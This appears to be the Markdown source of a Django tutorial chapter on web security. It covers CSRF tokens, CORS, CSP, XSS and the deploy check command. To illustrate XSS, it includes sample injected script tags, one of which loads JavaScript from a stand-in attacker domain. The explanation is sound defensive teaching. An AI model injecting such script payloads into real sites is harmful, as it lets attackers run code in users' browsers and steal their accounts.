---
title: "Security And Django"
description: >-
    You want to protect your users' privacy, right?
    The goal is noble
    and users demand it,
    but how do you do it?
    In this Understand Django article,
    we'll look at some areas
    that improve the security
    of your application.
image: /static/img/django.png
slug: secure-apps
date: 2022-03-10
categories:
 - Python
 - Django
tags:
 - Python
 - Django
 - security
series: "Understand Django"

---

In the last
{{< web >}}
[Understand Django](/blog/understand-django)
article,
{{< /web >}}
{{< book >}}
chapter,
{{< /book >}}
we learned about where apps slow down.
We explored techniques that help sites handle the load
and provide a fast experience for users.

{{< web >}}
With this article,
{{< /web >}}
{{< book >}}
With this chapter,
{{< /book >}}
we will look at security.
How does a Django site stay safe
on the big, bad internet?
Let's find out.

1. [From Browser To Django](/understand-django/browser-to-django)
2. [URLs Lead The Way](/understand-django/urls-lead-way)
3. [Views On Views](/understand-django/views-on-views)
4. [Templates For User Interfaces](/understand-django/templates-user-interfaces)
5. [User Interaction With Forms](/understand-django/user-interaction-forms)
6. [Store Data With Models](/understand-django/store-data-with-models)
7. [Administer All The Things](/understand-django/administer-all-the-things)
8. [Anatomy Of An Application](/understand-django/anatomy-of-an-application)
9. [User Authentication](/understand-django/user-authentication)
10. [Middleware Do You Go?](/understand-django/middleware-do-you-go)
11. [Serving Static Files](/understand-django/serving-static-files)
12. [Test Your Apps](/understand-django/test-your-apps)
13. [Deploy A Site Live](/understand-django/deploy-site-live)
14. [Per-visitor Data With Sessions](/understand-django/sessions)
15. [Making Sense Of Settings](/understand-django/settings)
16. [User File Use](/understand-django/media-files)
17. [Command Your App](/understand-django/command-apps)
18. [Go Fast With Django](/understand-django/go-fast)
19. Security And Django
20. [Debugging Tips And Techniques](/understand-django/debugging-tips-techniques)

## A Security Confession

I have a confession to make.
Of all the topics
that I've covered about Django
{{< web >}}
in this series,
{{< /web >}}
{{< book >}}
in this book,
{{< /book >}}
*this is my least favorite one.*
{{< web >}}
Perhaps that's why I've pushed the subject
so far into this list of articles.
{{< /web >}}

I have a very hard time getting excited about security
because it feels like a pure cost to me.
As developers,
we're in this arms race against malicious people
who want to steal and profit
from the data of others.
In a perfect world,
everyone would respect the privacy of others
and leave private data alone.
Alas,
the world is far from perfect.

The bad actors have devised clever and tricky methods
of exploiting websites
to steal data.
Because of this,
application developers have to implement guards
in an attempt to prevent these exploits.
Implementing those guards detract
from the main objective
of site building
and often feels like a drag on efficiency.

All that being said,
**security is super important**.
Even if you're like me
and the topic doesn't naturally interest you
(or actively feels like a waste of time),
the security of your application matters.

* Privacy matters.
* Trust matters.

If we cannot protect the information
that users of our Django sites bring,
then trust will rapidly erode
and, most likely,
your users will disappear along with it.

As noted in this section,
security is not my favorite topic.
I'm going to describe some security topics
as they relate to Django,
but if you want to learn from people who *love* security,
then I would recommend reading
from the
[Open Web Application Security Project](https://owasp.org/).
This popular group can teach you far more
about security
than I can,
and do it with gusto!

## The Three **C**s

Learning about security involves learning a bunch of acronyms.
I don't know if this is something that security researchers
like to do,
or if the reason is because the problems
that the acronyms stand for are challenging
to understand.
Either way,
let's look at three common acronyms that start with C
and the problems they address.

### CSRF

{{< web >}}
In a number of these Understand Django articles,
{{< /web >}}
{{< book >}}
In a number of these chapters,
{{< /book >}}
I have discussed CSRF briefly.
{{< web >}}
In the forms article,
{{< /web >}}
{{< book >}}
In the forms chapter,
{{< /book >}}
I did some hand waving and stated
that you need a CSRF token
for security reasons
and basically said "trust me" at the time.

CSRF stands for *Cross Site Request Forgery*.
In simple terms,
a CSRF attack allows an attacker to use someone's credentials
to a different site
without their permission.
With a bit of imagination,
you can see where this goes:

* Attacker socially manipulates a user to click a link.
* The click activity exploits the user's credentials to a site
    and changes something about the user's account
    like their email address.
* The attacker changes the email address to something they control.
* If the original site is something like an e-commerce site,
    the attacker may make purchases
    using the user's stored credit card information.

Django includes a capability to help thwart this kind of attack.
Through the use of **CSRF tokens**,
we can help prevent bad actors
from performing actions
without user consent.

A CSRF token works by including a generated value
that gets submitted along with the form.
The template looks like:

{{< web >}}
```django
<form method="POST">
  {% csrf_token %}
  <input name="myvalue">
  <input type="submit">
</form>
```
{{< /web >}}
{{< book >}}
```djangotemplate
<form method="POST">
  {% csrf_token %}
  <input name="myvalue">
  <input type="submit">
</form>
```
{{< /book >}}

When this renders,
the result would be something like:

```html
<form method="POST">
  <input type="hidden" name="csrfmiddlewaretoken"
    value="gubC92ukKk62qtvkjp1t6iinHgflk9LD5Uke53QYHqUobOIzRp9nv2DuFqwx9ors">
  <input name="myvalue">
  <input type="submit">
</form>
```

The value would naturally be different
from my example.
When the form is submitted,
the CSRF token gets checked for validity.
A valid CSRF token is required
to make a `POST` request,
so this level of checking can help prevent attackers
from changing a user's data
on your site.

You can learn more about CSRF
with Django's
[Cross Site Request Forgery protection](https://docs.djangoproject.com/en/4.1/ref/csrf/)
reference page.

### CORS

Imagine that you've built `myapp.com`.
For your user interface,
instead of Django templates,
you built a client UI
using a JavaScript framework
like [Vue.js](https://vuejs.org/).
Your application is serving static files
at `myapp.com`,
and you built a Django-powered API
that is handling the data
which gets called at `api.myapp.com`.

In this scenario,
browsers will require you to set up CORS.
CORS is *Cross-Origin Resource Sharing*.
The goal of CORS is to help protect a domain
from undesirable access.

In our example,
your API at `api.myapp.com` may only be designed
to work with the user interface
at `myapp.com`.
With CORS,
you can configure your API
so that it will reject any requests
that do not come
from the `myapp.com` domain.
This helps prevent bad actors
from using `api.myapp.com`
in the browser.

Django does *not* include tools
to handle CORS configuration
from the core package.
To make this work,
you'll need to reach for a third party package.
Since CORS configuration is handled
through HTTP headers,
you'll find that the very appropriately named
[django-cors-headers](https://github.com/adamchainz/django-cors-headers) package
is exactly what you need.

I won't walk through the whole setup
of that package
because the README does a good job
of explaining the process,
but I will highlight the crucial setting.
With django-cors-headers,
you need to set the `CORS_ALLOWED_ORIGINS` list.
Anything not in that list will be blocked
by CORS controls in the browser.
Our example configuration would look like:

```python
CORS_ALLOWED_ORIGINS = [
    "https://myapp.com",
]
```

As you read about CORS on the internet,
you'll probably run into advice to set the HTTP header
of `Access-Control-Allow-Origin: *`.
This wildcard is what you'll get if you set `CORS_ALLOW_ALL_ORIGINS = True`
in django-cors-headers.
*This is probably not what you really want.
Using this feature opts your site out of CORS protection.*
Unless you have some public web API
that is *designed* to work
for many domains,
you should try to avoid opting out of CORS.

CORS is not a core concept that you will find in Django.
If you want to learn more about the specifics of CORS,
check out
[Cross-Origin Resource Sharing (CORS)](https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS)
from the Mozilla Developer Network (MDN).

### CSP

The final **C** in our tour
is *Content Security Policy* or CSP, for short.
You might roughly think of CSP
as the inverse of CORS.
Where CORS defines what parts of the internet can access your domain,
CSP defines what your domain can access from the internet.

The goal of CSP is to protect users on your site
from running JavaScript
(and other potentially harmful resources like images)
from places that you don't want.

To understand how your site can be vulnerable
to these kinds of attacks,
we need to understand a well-known attack vector
called Cross-Site Scripting (XSS).
XSS is when a bad actor finds a way to run a script
on your domain.
Here's a classic way that XSS can happen:

* A site has a form that accepts text data.
* Then the site displays that text data *in its raw form*.

At first,
that seems harmless.

```html
<div class="area-where-user-content-gets-displayed">
  What could possibly go wrong?
</div>
```

For an honest interaction like "What could possibly go wrong?"
as user input,
that is truly harmless.
What about this?

```html
<div class="area-where-user-content-gets-displayed">
  I am getting <i>sneaky</i>.
</div>
```

Now,
the user added a bit of HTML markup.
Again,
this is fairly benign
and will only add some unanticipated italics.
What if the user is a bit more clever than that?

```html
<div class="area-where-user-content-gets-displayed">
  <script>alert("Boom goes the dynamite!")</script>
</div>
```

Here's where a site gets into trouble.
If this is rendered on a page,
a little alert box will appear.
You can imagine this happening in a forum
or some other sharing site
where multiple people will see this output.
That's annoying,
but it's still not horrible.

What does a really bad scenario look like?
A really bad scenario is where the bad guys figure out
that your site is unsafe in this way.
Consider this:

```html
<div class="area-where-user-content-gets-displayed">
  <script src="https://really-bad-guys.com/owned.js"></script>
</div>
```

Now your users are really in trouble.
In this final version,
the bad guys won.
A user's browser will download and execute whatever JavaScript
is in `owned.js`.
This code could do all kinds of stuff
like using the `fetch` API
to run AJAX requests
that can change the user's account credentials
and steal their account.

How do we defend against this kind of attack?
There isn't a singular answer.
In fact,
multiple layers of protection is often what you really want.
In security,
this idea is called "defense-in-depth."
If you have multiple layers to protect your site,
then the site may become a less appealing target
for attackers.

For this particular scenario,
we can use a couple of things

* HTML escaping of untrusted input
* CSP

The real problem above is that the site is rendering user input
without any modification.
This is a problem with HTML
because the raw characters are interpreted as HTML code
and not just user data.

The simplest solution is to make sure that any characters
that mean something specific to HTML
(like `<` or `>`)
are replaced with escape codes (`&lt;` or `&gt;`)
that will display the character
in the browser
without treating it like the actual HTML code character.
**Django does this auto-escaping of user data by default**.
You can disable this behavior for portions
of a template
using a variety of template tags
like `autoescape` and the (ironically named?) `safe` tag.

Because there are ways to opt out
of safe behavior from HTML escaping
and because clever attackers might find other ways
to inject script calls
into your site,
CSP is another layer of protection.

Primarily, CSP is possible
with a `Content-Security-Policy` HTTP header.
You can read all of the gritty details
on the
[Content Security Policy (CSP)](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP)
article on MDN.
Like CORS,
CSP is not something that Django supports out-of-the-box.
Thankfully, Mozilla (yep, the same Mozilla from MDN),
offers a
[django-csp](https://django-csp.readthedocs.io/en/latest/index.html) package
that you can use to configure an appropriate policy
for your Django site.

In a content security policy,
you mark everything that you want to allow.
This fundamentally changes what requests your site will connect to.
Instead of allowing everything by default,
the site operates on a model that denies things by default.
With a "deny by default" stance,
you can then pick resources
which you deem are safe for your site.
Modern browsers respect the policy declared
by the HTTP header
and will refuse to connect to resources
outside of your policy
when users visit your site at your domain.

There is something obvious
that we should get out of the way.
This setup and configuration requires *more work*.
Having more secure systems requires effort,
study,
and plenty of frustration
as you make a site more secure.
The benefits to your users or customers is
that their data stays safe.
I think most people expect this level of protection
by default.

So,
do you have to become a security expert
to build websites?
I don't think so.
There is a set of fundamental issues
with web application security
that you should know about
(and we've covered some of those issues already),
but you don't need to be prepared
to go to black hat conventions
in order to work on the web.

{{< web >}}
Before finishing up this security article,
{{< /web >}}
{{< book >}}
Before finishing up this security chapter,
{{< /book >}}
let's look at what Django provides
so that you can be less of a security expert
and use the knowledge
of the community.

## Check Command Revisited

The Django documentation includes a good overview
of the framework's security features
on the
[Security in Django](https://docs.djangoproject.com/en/dev/topics/security/) page.

Aside from the content outlined
on the security page,
we can return to the check command
{{< web >}}
discussed in previous articles.
{{< /web >}}
{{< book >}}
discussed in previous chapters.
{{< /book >}}
Recall that Django includes a `check` command
that can check your site's configuration
before you deploy a site live.
The command looks like:

```bash
$ ./manage.py check --deploy
```

The output from this command can show
where your configuration is less than ideal
from a security perspective.

The security warnings that come
from running the `check` command are defined
{{< web >}}
in `django.core.checks.security`.
{{< /web >}}
{{< book >}}
in `django.core. checks.security`.
{{< /book >}}
A more readable version
of the available security checks is
on the
[System check framework](https://docs.djangoproject.com/en/4.1/ref/checks/#security)
reference page.

Scanning through the list
of checks,
you'll find that

* many checks center around configuring your site
    to run with HTTPS.
    Secure connections used to reference SSL
    for Secure Sockets Layer.
    Along the way,
    that layer changed names to TLS
    for Transport Layer Security.
    In practice,
    if you see either of those terms,
    think `https://`.
* other checks confirm that your site has the kinds
    of
    [middleware](https://docs.djangoproject.com/en/4.1/ref/middleware/#security-middleware)
    installed
    that offer some
    of the protection discussed previously
    (like CSRF).
* still other checks look for core settings
    that should be set
    like `DEBUG = False`
    and defining the `ALLOWED_HOSTS` setting.

There is a good comment in the Django security checks reference docs
that is worth repeating here:

> The security checks do not make your site secure.
They do not audit code, do intrusion detection, or do anything particularly complex.
Rather, they help perform an automated, low-hanging-fruit checklist,
that can help you to improve your site’s security.

When you're thinking through security,
do some homework
and don't let your brain go on autopilot.
Remember that users develop a trust relationship
with your websites.
That trust is easy to break
and may cause people to leave your site forever.

## Summary

{{< web >}}
In this article,
{{< /web >}}
{{< book >}}
In this chapter,
{{< /book >}}
we explored security topics
and how they relate to Django.
We covered:

* CSRF
* CORS
* CSP
* Cross-site scripting (XSS)
* The security checks and information available
    from the `check` command

{{< web >}}
In the *last* article
of the Understand Django series,
{{< /web >}}
{{< book >}}
In the *last* chapter,
{{< /book >}}
we'll get into debugging.
You'll learn about:

* Debugging tools like `pdb`
* Browser tools
* Strategies for finding and fixing problems

{{< web >}}
If you have questions,
you can reach me online
on X
where I am
[@mblayman](https://x.com/mblayman).
{{< /web >}}
&nbsp;
